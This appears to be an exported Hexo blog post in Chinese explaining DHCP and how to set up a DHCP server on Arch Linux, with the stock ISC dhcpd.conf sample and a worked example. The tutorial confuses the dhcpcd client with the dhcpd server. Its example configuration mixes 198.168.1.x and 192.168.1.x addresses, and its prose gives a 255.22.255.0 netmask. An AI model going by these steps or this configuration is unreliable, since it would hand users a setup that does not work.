recommend.\nsubnet 10.254.239.32 netmask 255.255.255.224 {\n  range dynamic-bootp 10.254.239.40 10.254.239.60;\n  option broadcast-address 10.254.239.31;\n  option routers rtr-239-32-1.example.org;\n}\n# A slightly different configuration for an internal subnet.\nsubnet 10.5.5.0 netmask 255.255.255.224 {\n  range 10.5.5.26 10.5.5.30;\n  option domain-name-servers ns1.internal.example.org;\n  option domain-name \"internal.example.org\";\n  option routers 10.5.5.1;\n  option broadcast-address 10.5.5.31;\n  default-lease-time 600;\n  max-lease-time 7200;\n}\n# Hosts which require special configuration options can be listed in\n# host statements.   If no address is specified, the address will be\n# allocated dynamically (if possible), but the host-specific information\n# will still come from the host declaration.\nhost passacaglia {\n  hardware ethernet 0:0:c0:5d:bd:95;\n  filename \"vmunix.passacaglia\";\n  server-name \"toccata.example.com\";\n}\n# Fixed IP addresses can also be specified for hosts.   These addresses\n# should not also be listed as being available for dynamic assignment.\n# Hosts for which fixed IP addresses have been specified can boot using\n# BOOTP or DHCP.   Hosts for which no fixed address is specified can only\n# be booted with DHCP, unless there is an address range on the subnet\n# to which a BOOTP client is connected which has the dynamic-bootp flag\n# set.\nhost fantasia {\n  hardware ethernet 08:00:07:26:c0:a5;\n  fixed-address fantasia.example.com;\n}\n# You can declare a class of clients and then do address allocation\n# based on that.   The example below shows a case where all clients\n# in a certain class get addresses on the 10.17.224/24 subnet, and all\n# other clients get addresses on the 10.0.29/24 subnet.\nclass \"foo\" {\n  match if substring (option vendor-class-identifier, 0, 4) = \"SUNW\";\n}\nshared-network 224-29 {\n  subnet 10.17.224.0 netmask 255.255.255.0 {\n    option routers rtr-224.example.org;\n  }\n  subnet 10.0.29.0 netmask 255.255.255.0 {\n    option routers rtr-29.example.org;\n  }\n  pool {\n    allow members of \"foo\";\n    range 10.17.224.10 10.17.224.250;\n  }\n  pool {\n    deny members of \"foo\";\n    range 10.0.29.10 10.0.29.230;\n  }\n}\n```\n可以看到如上默认配置\n配置格式如下\n```\n# 全局配置\n参数或选项\t\t\t// 全局生效\n#局部配置\n声明 {\n\t参数或选项\t  // 局部生效\n}\n```\n##### 常用参数介绍\n我在[其他人博客](http://www.zyops.com/dhcp-working-procedure)看到常用参数说明，于是就拷贝下来\n![dhcp_config1](dhcp_config1.gif)\n![dhcp_config2](dhcp_config2.gif)\n![dhcp_config3](dhcp_config3.gif)\n\n##### 配置实例\n某单位销售部有80台计算机所使用的IP地址段为\n192.168.1.1-192.168.1.254,子网掩码为255.22.255.0，网关为\n192.168.1.1,192.168.1.2-192.168.1.30给各服务器使用，客户\n端仅可以使用192.168.1.100-192.168.1.200。剩余IP地址保留。\n```\nsubnet 198.168.1.0 netmask 255.255.255.0 {\n\toption routers 192.168.1.1;\n\toption subnet-mask 255.255.255.0;\n\toption nis-domain\t\t\t\t\"domain.org\";\n\toption domain-name\t\t\t\t\"domain.org\";\n\toption domain-name-servers \t192.168.1.2;\n\toption time-offset \t\t-18000;\n\toption netbios-node-type \t\t2;\n\trange dynamic-bootp\t198.168.1.100 192.168.1.200;\n\tdefault-lease-time \t43200;\n\thost ns {\n\t\tnext-server archlinux.org;\n\t\thardware ethernet ...;\n\t\tfixed-address ...;\n\t}\n}\n```\n##### 开启服务器\n```\nsystemctl start dhcpcd\n\n```\n##### 关闭服务器\n```\nsystemctl stop dhcpcd\n```","source":"_posts/use-dhcp.md","raw":"---\ntitle: DPCH (DPCHCD)服务器的搭建与应用\ndate: 2017-10-21 20:53:10\ntags: linux\ndir: linux\nkeywords:\n  - linux\n  - DPCH\n---\n### 什么是DHCP？\n#### 1.DHCP简介\nDHCP(Dynamic Host Configuration Protocol),动态主机配置协议，是一个应用层协议。当我们将客户主机ip地址设置为动态获取方式时，DHCP服务器就会根据DHCP协议给客户端分配IP，使得客户机能够利用这个IP上网。\n#### 2.为什么要使用DHCP？\nDHCP（Dynamic Host Configuration Protocol，动态主机配置协议）通常被应用在大型的局域网络环境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率。\n#### 3.DHCP实现\n![dhcp_client](dhcp_client.png)\nDHCP的实现分为4步，分别是：\n第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。\n第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。\n第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。\n第四步：DHCP Server发送ACK数据包，确认信息。\n####　4.安装DHCP服务器\n由于我使用的系统是archlinux，因此在我bash中之存在dhcpcd，当然他们是同名。\n使用如下命令安装\n```\npacman -S dhcpcd\n\n```\n检测是否安装成功,键入如下命令\n```\ndhcpcd --version\n//显示如下。。。代表安装成功\ndhcpcd 6.11.5\nCopyright (c) 2006-2016 Roy Marples\nCompiled in features: INET IPv4LL INET6 DHCPv6 AUTH\n\n```\n#### 5.DHCP服务器的一般配置\n##### dhcp服务器一般配置步骤\n1、dhcp服务器住配置文件dhcpd.conf，制定ip作用域，制定分配一个或多个ip地址范围\n2、建立租约数据库文件\n3、重新加载配置文件或重启dhcp服务器\n\n##### dhcp的工作流程\n在翻阅其他人的博客中，发现这个哥们的博客写的很好，因此[引用](http://www.zyops.com/dhcp-working-procedure)过来\n\n##### 配置文件DHCPD.CONF\n由于我的系统是archlinux，因此自动生成了一个dhcpd.conf文件在/etc目录之下。下面看一个完整的dhcpcd.conf：\n```\nvim /etc/dhcpd.conf \n# dhcpd.conf\n#\n# Sample configuration file for ISC dhcpd\n#\n# option definitions common to all supported networks...\noption domain-name \"example.org\";\noption domain-name-servers ns1.example.org, ns2.example.org;\ndefault-lease-time 600;\nmax-lease-time 7200;\n# Use this to enble / disable dynamic dns updates globally.\n#ddns-update-style none;\n# If this DHCP server is the official DHCP server for the local\n# network, the authoritative directive should be uncommented.\n#authoritative;\n# Use this to send dhcp log messages to a different log file (you also\n# have to hack syslog.conf to complete the redirection).\nlog-facility local7;\n# No service will be given on this subnet, but declaring it helps the \n# DHCP server to understand the network topology.\nsubnet 10.152.187.0 netmask 255.255.255.0 {\n}\n# This is a very basic subnet declaration.\nsubnet 10.254.239.0 netmask 255.255.255.224 {\n  range 10.254.239.10 10.254.239.20;\n  option routers rtr-239-0-1.example.org, rtr-239-0-2.example.org;\n}\n# This declaration allows BOOTP clients to get dynamic addresses,\n# which we don't really recommend.\nsubnet 10.254.239.32 netmask 255.255.255.224 {\n  range dynamic-bootp 10.254.239.40 10.254.239.60;\n  option broadcast-address 10.254.239.31;\n  option routers rtr-239-32-1.example.org;\n}\n# A slightly different configuration for an internal subnet.\nsubnet 10.5.5.0 netmask 255.255.255.224 {\n  range 10.5.5.26 10.5.5.30;\n  option domain-name-servers ns1.internal.example.org;\n  option domain-name \"internal.example.org\";\n  option routers 10.5.5.1;\n  option broadcast-address 10.5.5.31;\n  default-lease-time 600;\n  max-lease-time 7200;\n}\n# Hosts which require special configuration options can be listed in\n# host statements.   If no address is specified, the address will be\n# allocated dynamically (if possible), but the host-specific information\n# will still come from the host declaration.\nhost passacaglia {\n  hardware ethernet 0:0:c0:5d:bd:95;\n  filename \"vmunix.passacaglia\";\n  server-name \"toccata.example.com\";\n}\n# Fixed IP addresses can also be specified for hosts.   These addresses\n# should not also be listed as being available for dynamic assignment.\n# Hosts for which fixed IP addresses have been specified can boot using\n# BOOTP or DHCP.   Hosts for which no fixed address is specified can only\n# be booted with DHCP, unless there is an address range on the subnet\n# to which a BOOTP client is connected which has the dynamic-bootp flag\n# set.\nhost fantasia {\n  hardware ethernet 08:00:07:26:c0:a5;\n  fixed-address fantasia.example.com;\n}\n# You can declare a class of clients and then do address allocation\n# based on that.   The example below shows a case where all clients\n# in a certain class get addresses on the 10.17.224/24 subnet, and all\n# other clients get addresses on the 10.0.29/24 subnet.\nclass \"foo\" {\n  match if substring (option vendor-class-identifier, 0, 4) = \"SUNW\";\n}\nshared-network 224-29 {\n  subnet 10.17.224.0 netmask 255.255.255.0 {\n    option routers rtr-224.example.org;\n  }\n  subnet 10.0.29.0 netmask 255.255.255.0 {\n    option routers rtr-29.example.org;\n  }\n  pool {\n    allow members of \"foo\";\n    range 10.17.224.10 10.17.224.250;\n  }\n  pool {\n    deny members of \"foo\";\n    range 10.0.29.10 10.0.29.230;\n  }\n}\n```\n可以看到如上默认配置\n配置格式如下\n```\n# 全局配置\n参数或选项\t\t\t// 全局生效\n#局部配置\n声明 {\n\t参数或选项\t  // 局部生效\n}\n```\n##### 常用参数介绍\n我在[其他人博客](http://www.zyops.com/dhcp-working-procedure)看到常用参数说明，于是就拷贝下来\n![dhcp_config1](dhcp_config1.gif)\n![dhcp_config2](dhcp_config2.gif)\n![dhcp_config3](dhcp_config3.gif)\n\n##### 配置实例\n某单位销售部有80台计算机所使用的IP地址段为\n192.168.1.1-192.168.1.254,子网掩码为255.22.255.0，网关为\n192.168.1.1,192.168.1.2-192.168.1.30给各服务器使用，客户\n端仅可以使用192.168.1.100-192.168.1.200。剩余IP地址保留。\n```\nsubnet 198.168.1.0 netmask 255.255.255.0 {\n\toption routers 192.168.1.1;\n\toption subnet-mask 255.255.255.0;\n\toption nis-domain\t\t\t\t\"domain.org\";\n\toption domain-name\t\t\t\t\"domain.org\";\n\toption domain-name-servers \t192.168.1.2;\n\toption time-offset \t\t-18000;\n\toption netbios-node-type \t\t2;\n\trange dynamic-bootp\t198.168.1.100 192.168.1.200;\n\tdefault-lease-time \t43200;\n\thost ns {\n\t\tnext-server archlinux.org;\n\t\thardware ethernet ...;\n\t\tfixed-address ...;\n\t}\n}\n```\n##### 开启服务器\n```\nsystemctl start dhcpcd\n\n```\n##### 关闭服务器\n```\nsystemctl stop dhcpcd\n```","slug":"use-dhcp","published":1,"updated":"2021-10-13T15:51:25.920Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0a001j4jzxbja0pecd","content":"<h3 id=\"什么是DHCP？\"><a href=\"#什么是DHCP？\" class=\"headerlink\" title=\"什么是DHCP？\"></a>什么是DHCP？</h3><h4 id=\"1-DHCP简介\"><a href=\"#1-DHCP简介\" class=\"headerlink\" title=\"1.DHCP简介\"></a>1.DHCP简介</h4><p>DHCP(Dynamic Host Configuration Protocol),动态主机配置协议，是一个应用层协议。当我们将客户主机ip地址设置为动态获取方式时，DHCP服务器就会根据DHCP协议给客户端分配IP，使得客户机能够利用这个IP上网。</p><h4 id=\"2-为什么要使用DHCP？\"><a href=\"#2-为什么要使用DHCP？\" class=\"headerlink\" title=\"2.为什么要使用DHCP？\"></a>2.为什么要使用DHCP？</h4><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）通常被应用在大型的局域网络环境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率。</p><h4 id=\"3-DHCP实现\"><a href=\"#3-DHCP实现\" class=\"headerlink\" title=\"3.DHCP实现\"></a>3.DHCP实现</h4><p><img src=\"/img/loading.gif\" data-original=\"/linux/use-dhcp/dhcp_client.png\" alt=\"dhcp_client\"><br>DHCP的实现分为4步，分别是：<br>第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。<br>第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。<br>第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。<br>第四步：DHCP Server发送ACK数据包，确认信息。</p><p>####　4.安装DHCP服务器<br>由于我使用的系统是archlinux，因此在我bash中之存在dhcpcd，当然他们是同名。<br>使用如下命令安装<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pacman -S dhcpcd</span><br></pre></td></tr></table></figure><p></p><p>检测是否安装成功,键入如下命令<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dhcpcd --version</span><br><span class=\"line\">//显示如下。。。代表安装成功</span><br><span class=\"line\">dhcpcd 6.11.5</span><br><span class=\"line\">Copyright (c) 2006-2016 Roy Marples</span><br><span class=\"line\">Compiled in features: INET IPv4LL INET6 DHCPv6 AUTH</span><br></pre></td></tr></table></figure><p></p><h4 id=\"5-DHCP服务器的一般配置\"><a href=\"#5-DHCP服务器的一般配置\" class=\"headerlink\" title=\"5.DHCP服务器的一般配置\"></a>5.DHCP服务器的一般配置</h4><h5 id=\"dhcp服务器一般配置步骤\"><a href=\"#dhcp服务器一般配置步骤\" class=\"headerlink\" title=\"dhcp服务器一般配置步骤\"></a>dhcp服务器一般配置步骤</h5><p>1、dhcp服务器住配置文件dhcpd.conf，制定ip作用域，制定分配一个或多个ip地址范围<br>2、建立租约数据库文件<br>3、重新加载配置文件或重启dhcp服务器</p><h5 id=\"dhcp的工作流程\"><a href=\"#dhcp的工作流程\" class=\"headerlink\" title=\"dhcp的工作流程\"></a>dhcp的工作流程</h5><p>在翻阅其他人的博客中，发现这个哥们的博客写的很好，因此<a href=\"http://www.zyops.com/dhcp-working-procedure\" target=\"_blank\" rel=\"noopener\">引用</a>过来</p><h5 id=\"配置文件DHCPD-CONF\"><a href=\"#配置文件DHCPD-CONF\" class=\"headerlink\" title=\"配置文件DHCPD.CONF\"></a>配置文件DHCPD.CONF</h5><p>由于我的系统是archlinux，因此自动生成了一个dhcpd.conf文件在/etc目录之下。下面看一个完整的dhcpcd.conf：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/dhcpd.conf </span><br><span class=\"line\"># dhcpd.conf</span><br><span class=\"line\">#</span><br><span class=\"line\"># Sample configuration file for ISC dhcpd</span><br><span class=\"line\">#</span><br><span class=\"line\"># option definitions common to all supported networks...</span><br><span class=\"line\">option domain-name &quot;example.org&quot;;</span><br><span class=\"line\">option domain-name-servers ns1.example.org, ns2.example.org;</span><br><span class=\"line\">default-lease-time 600;</span><br><span class=\"line\">max-lease-time 7200;</span><br><span class=\"line\"># Use this to enble / disable dynamic dns updates globally.</span><br><span class=\"line\">#ddns-update-style none;</span><br><span class=\"line\"># If this DHCP server is the official DHCP server for the local</span><br><span class=\"line\"># network, the authoritative directive should be uncommented.</span><br><span class=\"line\">#authoritative;</span><br><span class=\"line\"># Use this to send dhcp log messages to a different log file (you also</span><br><span class=\"line\"># have to hack syslog.conf to complete the redirection).</span><br><span class=\"line\">log-facility local7;</span><br><span class=\"line\"># No service will be given on this subnet, but declaring it helps the </span><br><span class=\"line\"># DHCP server to understand the network topology.</span><br><span class=\"line\">subnet 10.152.187.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># This is a very basic subnet declaration.</span><br><span class=\"line\">subnet 10.254.239.0 netmask 255.255.255.224 &#123;</span><br><span class=\"line\">  range 10.254.239.10 10.254.239.20;</span><br><span class=\"line\">  option routers rtr-239-0-1.example.org, rtr-239-0-2.example.org;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># This declaration allows BOOTP clients to get dynamic addresses,</span><br><span class=\"line\"># which we don&apos;t really recommend.</span><br><span class=\"line\">subnet 10.254.239.32 netmask 255.255.255.224 &#123;</span><br><span class=\"line\">  range dynamic-bootp 10.254.239.40 10.254.239.60;</span><br><span class=\"line\">  option broadcast-address 10.254.239.31;</span><br><span class=\"line\">  option routers rtr-239-32-1.example.org;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># A slightly different configuration for an internal subnet.</span><br><span class=\"line\">subnet 10.5.5.0 netmask 255.255.255.224 &#123;</span><br><span class=\"line\">  range 10.5.5.26 10.5.5.30;</span><br><span class=\"line\">  option domain-name-servers ns1.internal.example.org;</span><br><span class=\"line\">  option domain-name &quot;internal.example.org&quot;;</span><br><span class=\"line\">  option routers 10.5.5.1;</span><br><span class=\"line\">  option broadcast-address 10.5.5.31;</span><br><span class=\"line\">  default-lease-time 600;</span><br><span class=\"line\">  max-lease-time 7200;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># Hosts which require special configuration options can be listed in</span><br><span class=\"line\"># host statements.   If no address is specified, the address will be</span><br><span class=\"line\"># allocated dynamically (if possible), but the host-specific information</span><br><span class=\"line\"># will still come from the host declaration.</span><br><span class=\"line\">host passacaglia &#123;</span><br><span class=\"line\">  hardware ethernet 0:0:c0:5d:bd:95;</span><br><span class=\"line\">  filename &quot;vmunix.passacaglia&quot;;</span><br><span class=\"line\">  server-name &quot;toccata.example.com&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># Fixed IP addresses can also be specified for hosts.   These addresses</span><br><span class=\"line\"># should not also be listed as being available for dynamic assignment.</span><br><span class=\"line\"># Hosts for which fixed IP addresses have been specified can boot using</span><br><span class=\"line\"># BOOTP or DHCP.   Hosts for which no fixed address is specified can only</span><br><span class=\"line\"># be booted with DHCP, unless there is an address range on the subnet</span><br><span class=\"line\"># to which a BOOTP client is connected which has the dynamic-bootp flag</span><br><span class=\"line\"># set.</span><br><span class=\"line\">host fantasia &#123;</span><br><span class=\"line\">  hardware ethernet 08:00:07:26:c0:a5;</span><br><span class=\"line\">  fixed-address fantasia.example.com;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># You can declare a class of clients and then do address allocation</span><br><span class=\"line\"># based on that.   The example below shows a case where all clients</span><br><span class=\"line\"># in a certain class get addresses on the 10.17.224/24 subnet, and all</span><br><span class=\"line\"># other clients get addresses on the 10.0.29/24 subnet.</span><br><span class=\"line\">class &quot;foo&quot; &#123;</span><br><span class=\"line\">  match if substring (option vendor-class-identifier, 0, 4) = &quot;SUNW&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">shared-network 224-29 &#123;</span><br><span class=\"line\">  subnet 10.17.224.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">    option routers rtr-224.example.org;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  subnet 10.0.29.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">    option routers rtr-29.example.org;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pool &#123;</span><br><span class=\"line\">    allow members of &quot;foo&quot;;</span><br><span class=\"line\">    range 10.17.224.10 10.17.224.250;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pool &#123;</span><br><span class=\"line\">    deny members of &quot;foo&quot;;</span><br><span class=\"line\">    range 10.0.29.10 10.0.29.230;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>可以看到如上默认配置<br>配置格式如下<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 全局配置</span><br><span class=\"line\">参数或选项\t\t\t// 全局生效</span><br><span class=\"line\">#局部配置</span><br><span class=\"line\">声明 &#123;</span><br><span class=\"line\">\t参数或选项\t  // 局部生效</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h5 id=\"常用参数介绍\"><a href=\"#常用参数介绍\" class=\"headerlink\" title=\"常用参数介绍\"></a>常用参数介绍</h5><p>我在<a href=\"http://www.zyops.com/dhcp-working-procedure\" target=\"_blank\" rel=\"noopener\">其他人博客</a>看到常用参数说明，于是就拷贝下来<br><img src=\"/img/loading.gif\" data-original=\"/linux/use-dhcp/dhcp_config1.gif\" alt=\"dhcp_config1\"><br><img src=\"/img/loading.gif\" data-original=\"/linux/use-dhcp/dhcp_config2.gif\" alt=\"dhcp_config2\"><br><img src=\"/img/loading.gif\" data-original=\"/linux/use-dhcp/dhcp_config3.gif\" alt=\"dhcp_config3\"></p><h5 id=\"配置实例\"><a href=\"#配置实例\" class=\"headerlink\" title=\"配置实例\"></a>配置实例</h5><p>某单位销售部有80台计算机所使用的IP地址段为<br>192.168.1.1-192.168.1.254,子网掩码为255.22.255.0，网关为<br>192.168.1.1,192.168.1.2-192.168.1.30给各服务器使用，客户<br>端仅可以使用192.168.1.100-192.168.1.200。剩余IP地址保留。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">subnet 198.168.1.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">\toption routers 192.168.1.1;</span><br><span class=\"line\">\toption subnet-mask 255.255.255.0;</span><br><span class=\"line\">\toption nis-domain\t\t\t\t&quot;domain.org&quot;;</span><br><span class=\"line\">\toption domain-name\t\t\t\t&quot;domain.org&quot;;</span><br><span class=\"line\">\toption domain-name-servers \t192.168.1.2;</span><br><span class=\"line\">\toption time-offset \t\t-18000;</span><br><span class=\"line\">\toption netbios-node-type \t\t2;</span><br><span class=\"line\">\trange dynamic-bootp\t198.168.1.100 192.168.1.200;</span><br><span class=\"line\">\tdefault-lease-time \t43200;</span><br><span class=\"line\">\thost ns &#123;</span><br><span class=\"line\">\t\tnext-server archlinux.org;</span><br><span class=\"line\">\t\thardware ethernet ...;</span><br><span class=\"line\">\t\tfixed-address ...;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h5 id=\"开启服务器\"><a href=\"#开启服务器\" class=\"headerlink\" title=\"开启服务器\"></a>开启服务器</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start dhcpcd</span><br></pre></td></tr></table></figure><h5 id=\"关闭服务器\"><a href=\"#关闭服务器\" class=\"headerlink\" title=\"关闭服务器\"></a>关闭服务器</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl stop dhcpcd</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"什么是DHCP？\"><a href=\"#什么是DHCP？\" class=\"headerlink\" title=\"什么是DHCP？\"></a>什么是DHCP？</h3><h4 id=\"1-DHCP简介\"><a href=\"#1-DHCP简介\" class=\"headerlink\" title=\"1.DHCP简介\"></a>1.DHCP简介</h4><p>DHCP(Dynamic Host Configuration Protocol),动态主机配置协议，是一个应用层协议。当我们将客户主机ip地址设置为动态获取方式时，DHCP服务器就会根据DHCP协议给客户端分配IP，使得客户机能够利用这个IP上网。</p><h4 id=\"2-为什么要使用DHCP？\"><a href=\"#2-为什么要使用DHCP？\" class=\"headerlink\" title=\"2.为什么要使用DHCP？\"></a>2.为什么要使用DHCP？</h4><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）通常被应用在大型的局域网络环境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率。</p><h4 id=\"3-DHCP实现\"><a href=\"#3-DHCP实现\" class=\"headerlink\" title=\"3.DHCP实现\"></a>3.DHCP实现</h4><p><img src=\"/linux/use-dhcp/dhcp_client.png\" alt=\"dhcp_client\"><br>DHCP的实现分为4步，分别是：<br>第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。<br>第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。<br>第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。<br>第四步：DHCP Server发送ACK数据包，确认信息。</p><p>####　4.安装DHCP服务器<br>由于我使用的系统是archlinux，因此在我bash中之存在dhcpcd，当然他们是同名。<br>使用如下命令安装<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pacman -S dhcpcd</span><br></pre></td></tr></table></figure><p></p><p>检测是否安装成功,键入如下命令<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dhcpcd --version</span><br><span class=\"line\">//显示如下。。。代表安装成功</span><br><span class=\"line\">dhcpcd 6.11.5</span><br><span class=\"line\">Copyright (c) 2006-2016 Roy Marples</span><br><span class=\"line\">Compiled in features: INET IPv4LL INET6 DHCPv6 AUTH</span><br></pre></td></tr></table></figure><p></p><h4 id=\"5-DHCP服务器的一般配置\"><a href=\"#5-DHCP服务器的一般配置\" class=\"headerlink\" title=\"5.DHCP服务器的一般配置\"></a>5.DHCP服务器的一般配置</h4><h5 id=\"dhcp服务器一般配置步骤\"><a href=\"#dhcp服务器一般配置步骤\" class=\"headerlink\" title=\"dhcp服务器一般配置步骤\"></a>dhcp服务器一般配置步骤</h5><p>1、dhcp服务器住配置文件dhcpd.conf，制定ip作用域，制定分配一个或多个ip地址范围<br>2、建立租约数据库文件<br>3、重新加载配置文件或重启dhcp服务器</p><h5 id=\"dhcp的工作流程\"><a href=\"#dhcp的工作流程\" class=\"headerlink\" title=\"dhcp的工作流程\"></a>dhcp的工作流程</h5><p>在翻阅其他人的博客中，发现这个哥们的博客写的很好，因此<a href=\"http://www.zyops.com/dhcp-working-procedure\" target=\"_blank\" rel=\"noopener\">引用</a>过来</p><h5 id=\"配置文件DHCPD-CONF\"><a href=\"#配置文件DHCPD-CONF\" class=\"headerlink\" title=\"配置文件DHCPD.CONF\"></a>配置文件DHCPD.CONF</h5><p>由于我的系统是archlinux，因此自动生成了一个dhcpd.conf文件在/etc目录之下。下面看一个完整的dhcpcd.conf：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span 